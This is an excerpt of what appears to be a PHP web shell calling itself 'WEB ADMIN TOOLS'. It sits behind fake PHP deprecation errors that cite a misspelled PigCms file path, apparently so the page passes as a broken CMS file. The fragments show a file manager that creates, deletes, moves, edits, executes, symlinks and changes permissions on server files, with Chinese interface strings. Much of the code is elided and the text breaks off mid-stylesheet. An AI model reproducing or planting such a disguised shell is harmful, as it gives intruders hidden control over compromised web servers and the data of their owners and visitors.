<br />
<b>Deprecated</b>:  Function eregi() is deprecated in <b>D:\0825web\iwxcms7\PigCms\Lib\Action\User\BusinessflowerActlon.clasc.php</b> on line <b>917</b><br />
<br />
<b>Deprecated</b>:  Function eregi() is deprecated in <b>D:\0825web\iwxcms7\PigCms\Lib\Action\User\BusinessflowerActlon.clasc.php</b> on line <b>917</b><br />
<br />
<b>Deprecated</b>:  Function eregi() is deprecated in <b>D:\0825web\iwxcms7\PigCms\Lib\Action\User\BusinessflowerActlon.clasc.php</b> on line <b>917</b><br />
...
function listing_page ($message = null) {
	...
	echo '<h1 style="margin-bottom: 0">WEB ADMIN TOOLS</h1>
...
'password' => '密码',
'add' => '添加',
'add_basic_auth' => '添加basic-authentification',
...
'created' => '"[%1]" 已被创建',
'not_created' => '"[%1]" 未能被创建',
'really_delete' => '删除这些文件文件？',
'deleted' => "这些文件已经被删除:\n[%1]",
'not_deleted' => "这些文件未能被删除:\n[%1]",
'rename_file' => '重命名文件:',
'renamed' => '"[%1]" 已被命名为 "[%2]".',
'not_renamed' => '"[%1] 未能被命名为 "[%2]".',
'move_files' => '移动这些文件:',
'moved' => "这些文件已被移动到 \"[%2]\":\n[%1]",
'not_moved' => "这些文件未能被移动到 \"[%2]\":\n[%1]",
'copy_files' => '复制这些文件:',
'copied' => "这些文件已经被复制到 \"[%2]\":\n[%1]",
'not_copied' => "这些文件未能复制到 \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" 不能被编辑。',
'executed' => "\"[%1]\" 已成功运行:\n{%2}",
'not_executed' => "\"[%1]\" 未能成功运行:\n{%2}",
'saved' => '"[%1]" 已被保存.',
'not_saved' => '"[%1]" 未能保存.',
'symlinked' => 'Symlink 从 "[%2]" 到 "[%1]" 已被创建.',
'not_symlinked' => 'Symlink 从 "[%2]" 到 "[%1]" 未被创建.',
'permission_for' => '权限 "[%1]":',
'permission_set' => '权限 "[%1]" 被设置为 [%2].',
'permission_not_set' => 'P权限 "[%1]" 未能被设置为 [%2].',
'not_readable' => '"[%1]" 不可读。'
		);
...
#error td { background: maroon; color: w